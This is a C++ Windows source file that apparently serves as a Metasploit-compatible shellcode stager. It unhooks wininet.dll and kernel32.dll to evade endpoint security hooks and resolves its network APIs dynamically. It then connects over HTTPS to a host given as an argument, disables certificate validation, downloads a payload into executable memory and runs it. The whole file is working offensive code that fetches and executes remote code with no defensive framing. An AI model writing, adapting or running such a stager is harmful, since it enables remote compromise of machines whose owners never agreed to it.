#include <Windows.h>
#include <winhttp.h>
#include <wininet.h>
#include <stdio.h>
#include "../Utils/utils.h"

/*
HINTERNET InternetOpenA(
  [in] LPCSTR lpszAgent,
  [in] DWORD  dwAccessType,
  [in] LPCSTR lpszProxy,
  [in] LPCSTR lpszProxyBypass,
  [in] DWORD  dwFlags
);
*/

typedef LPVOID(WINAPI* pInternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);

/*
HINTERNET InternetConnectA(
  [in] HINTERNET     hInternet,
  [in] LPCSTR        lpszServerName,
  [in] INTERNET_PORT nServerPort,
  [in] LPCSTR        lpszUserName,
  [in] LPCSTR        lpszPassword,
  [in] DWORD         dwService,
  [in] DWORD         dwFlags,
  [in] DWORD_PTR     dwContext
);
*/

typedef LPVOID(WINAPI* pInternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);

/*
HINTERNET HttpOpenRequestA(
  [in] HINTERNET hConnect,
  [in] LPCSTR    lpszVerb,
  [in] LPCSTR    lpszObjectName,
  [in] LPCSTR    lpszVersion,
  [in] LPCSTR    lpszReferrer,
  [in] LPCSTR    *lplpszAcceptTypes,
  [in] DWORD     dwFlags,
  [in] DWORD_PTR dwContext
);
*/

typedef LPVOID(WINAPI* pHttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);

/*
BOOL InternetSetOptionA(
  [in] HINTERNET hInternet,
  [in] DWORD     dwOption,
  [in] LPVOID    lpBuffer,
  [in] DWORD     dwBufferLength
);
*/

typedef BOOL(WINAPI* pInternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);

/*
BOOL HttpSendRequestA(
	[in] HINTERNET hRequest,
	[in] LPCSTR    lpszHeaders,
	[in] DWORD     dwHeadersLength,
	[in] LPVOID    lpOptional,
	[in] DWORD     dwOptionalLength
);
*/

typedef BOOL(WINAPI* pHttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);

/*
BOOL InternetReadFile(
  [in]  HINTERNET hFile,
  [out] LPVOID    lpBuffer,
  [in]  DWORD     dwNumberOfBytesToRead,
  [out] LPDWORD   lpdwNumberOfBytesRead
);
*/

typedef LPVOID(WINAPI* pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);

/*
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);*/

typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD fAllocationType, DWORD flProtect);


int main(int argc, const char* argv[])
{
	const char* msf_checksum = "HvLrWsodlsuSMpMw-HEe5wmOr1nV_kOATnEi8sn0JbT-yb8lxmbxpyBayQzEk1xUYxbF3H6Up223JLX28xhMipq51Jzj0MuROkkp6eGFvTNZY-hbc9hgsVqpUGCVAAUwIIUv5ow_BoXuQ4HsjrBwCX9iV3pMiVafAjWok02kxI9wakLFnTBgy8Vnr3A5ap3OvzMQdNVKAp3AP2sT08veb";
	/*
	#define INTERNET_OPEN_TYPE_PRECONFIG                    0   // use registry configuration
	#define INTERNET_OPEN_TYPE_DIRECT                       1   // direct to net
	*/
	DWORD dwAccessType = 0;

	if (argc < 3)
	{
		printf(".exe <host> <port> [<msf checksum>] [<dwAccessType> (0=system proxy | 1=no system proxy)]\n");
		exit(1);
	}

	const char* host = static_cast<const char*>(argv[1]);
	DWORD port = static_cast<DWORD>(std::atoi(argv[2]));

	if (argc == 5)
	{
		msf_checksum = static_cast<const char*>(argv[3]);
		dwAccessType = static_cast<DWORD>(std::atoi(argv[4]));
		printf("dwAccessType = %d\n", dwAccessType);
	}

	std::string checksum = "/";
	checksum += msf_checksum;

	HMODULE wininetdll;
	HMODULE kernel32dll;

	const char* wininet = "Wininet";
	const char* kernel32 = "Kernel32";

	LoadLibraryA("wininet"); 

	unhookModule(wininet, "c:\\windows\\system32\\wininet.dll");
	unhookModule(kernel32, "c:\\windows\\system32\\kernel32.dll");

	wininetdll = GetModuleHandleA(wininet);
	kernel32dll = GetModuleHandleA(kernel32);

	pVirtualAlloc VirtualAlloc = (pVirtualAlloc)GetProcAddress(kernel32dll, "VirtualAlloc");
	printf("[*] found VirtualAlloc: 0x%p\n", VirtualAlloc);
	pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(wininetdll, "InternetOpenA");
	printf("[*] found InternetOpenA: 0x%p\n", InternetOpenA);
	pInternetConnectA InternetConnectA = (pInternetConnectA)GetProcAddress(wininetdll, "InternetConnectA");
	printf("[*] found InternetConnectA: 0x%p\n", InternetConnectA);
	pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)GetProcAddress(wininetdll, "HttpOpenRequestA");
	printf("[*] found HttpOpenRequestA: 0x%p\n", HttpOpenRequestA);
	pInternetSetOptionA InternetSetOptionA = (pInternetSetOptionA)GetProcAddress(wininetdll, "InternetSetOptionA");
	printf("[*] found InternetSetOptionA: 0x%p\n", InternetSetOptionA);
	pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)GetProcAddress(wininetdll, "HttpSendRequestA");
	printf("[*] found HttpSendRequestA: 0x%p\n", HttpSendRequestA);
	pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(wininetdll, "InternetReadFile");
	printf("[*] found InternetReadFile: 0x%p\n", InternetReadFile);

	DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
	HINTERNET hInternet = InternetOpenA(NULL, dwAccessType, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", checksum.data(), NULL, NULL, NULL,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_UI, 0);
	BOOL res = InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
	BOOL hFile = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);

	SIZE_T memsize = 0x00400000;
	SIZE_T bytesToRead = 8192;
	DWORD bytesRead;

	LPVOID memalloc = VirtualAlloc(NULL, memsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID expladdr = memalloc;
	SIZE_T explsize = 0;

	if (InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead))
	{
		while (bytesRead != 0)
		{
			explsize = explsize + bytesToRead;
			memalloc = (char*)memalloc + bytesRead;
			InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead);
		}
	}
	printf("[*] Downloaded %d bytes\n", explsize);
	printf("[*] Starting expl...\n");
	((void(*)())expladdr)();

	return 1;
}